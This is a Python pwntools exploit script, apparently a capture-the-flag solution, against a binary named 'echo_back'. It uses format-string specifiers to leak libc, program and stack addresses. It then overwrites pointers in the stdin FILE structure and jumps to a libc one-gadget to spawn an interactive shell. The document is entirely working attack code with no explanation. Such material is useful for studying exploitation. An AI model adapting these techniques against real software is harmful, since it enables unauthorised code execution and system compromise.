from pwn import *
context.update(arch='amd64', log_level='debug')
context.terminal=['tmux','splitw','-h']
#p = remote('111.198.29.45','30380')
p = process('./echo_back')
l = ELF('/libc64.so')
e = ELF('./echo_back')

def echo(length, data):
    p.sendlineafter('>>', '2')
    p.sendafter('length', str(length))
    p.send(str(data))
    try:
        p.recvuntil('anonymous say:',timeout=0.5)
        return p.recvuntil('-----', drop=True)
    except Exception as e:
        pass

def set_name(data):
    p.sendlineafter('>>', '1')
    p.sendafter('name', str(data))

def dbg(code=''):
    gdb.attach(p,code)

if __name__ == '__main__':
    l.address = int(echo('7\n', '%2$p'), 16) - 0x3c6780
    e.address = int(echo('7\n', '%6$p'), 16) - 0xef8
    stack_addr = int(echo('7\n', '%7$p'), 16) - 0x18
    set_name(p64(l.symbols['_IO_2_1_stdin_']+0x38))
    echo('7\n', '%16$hhn\n')
    echo(str(p64(l.address+0x3c4963)*3+p64(stack_addr)+p64(stack_addr+8)), '\n')
    for _ in range(0x27):
        p.sendlineafter('>>', '2')
        p.sendlineafter('length', '')
    dbg("breakrva 0xbd5")
    p.sendlineafter('>>', '2')
    p.sendlineafter('length', p64(l.address+0x45216))
    p.sendline()
    p.interactive()

